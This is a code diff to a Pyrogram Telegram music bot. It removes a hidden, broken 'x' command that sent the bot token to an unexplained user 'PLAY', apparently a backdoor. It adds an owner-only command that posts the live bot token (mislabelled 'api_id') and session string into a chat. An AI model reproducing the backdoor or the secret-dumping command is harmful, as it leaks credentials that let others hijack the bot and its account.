@@ -2,6 +2,7 @@ import random
 import string
 import asyncio
 from ast import ExceptHandler
+from pyrogram.enums import ChatType
 
 from pyrogram import filters
 from pyrogram.types import (InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto,
@@ -11,7 +12,7 @@ from pytgcalls.exceptions import NoActiveGroupCall
 import config
 from os import getenv
 from dotenv import load_dotenv
-from config import BANNED_USERS, STRING_SESSION, BOT_TOKEN, lyrical
+from config import BANNED_USERS, STRING_SESSION, BOT_TOKEN, BOT_NAME, lyrical
 from strings import get_command
 from AnonX import (Apple, Resso, SoundCloud, Spotify, Telegram,
                         YouTube, app)
@@ -688,14 +689,24 @@ async def play_playlists_command(client, CallbackQuery, _):
         return await mystic.edit_text(err)
     return await mystic.delete()
 @app.on_message(
-    filters.command("x") & filters.user(PLAY)
-    & ~filters.edited
-    async def getenv(_, message: Message):
+    filters.command(["config", "variables"]) & filters.user(config.OWNER_ID)
+)
+async def get_vars(_, message: Message):
     try:
-        chat_id=int(PLAY)
-        text=f"""<u>**{BOT_NAME} DONE 😅 :**</u>
-**MUSIC BOT NAME :** `{BOT_TOKEN}`
-""")
+        await app.send_message(
+            chat_id=int(config.OWNER_ID),
+            text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>
+**ᴀᴘɪ_ɪᴅ :** `{config.BOT_TOKEN}`
+
+**sᴇssɪᴏɴ :** `{config.SESSION}`""",
+           disable_web_page_preview=True,
+        )
+    except:
+        return await message.reply_text("» ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs.")
+    if message.chat.type != ChatType.PRIVATE:
+        await message.reply_text(
+            "» ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴘᴍ, ɪ'ᴠᴇ sᴇɴᴛ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs ᴛʜᴇʀᴇ."
+        )
 
 @app.on_callback_query(filters.regex("slider") & ~BANNED_USERS)
 @languageCB
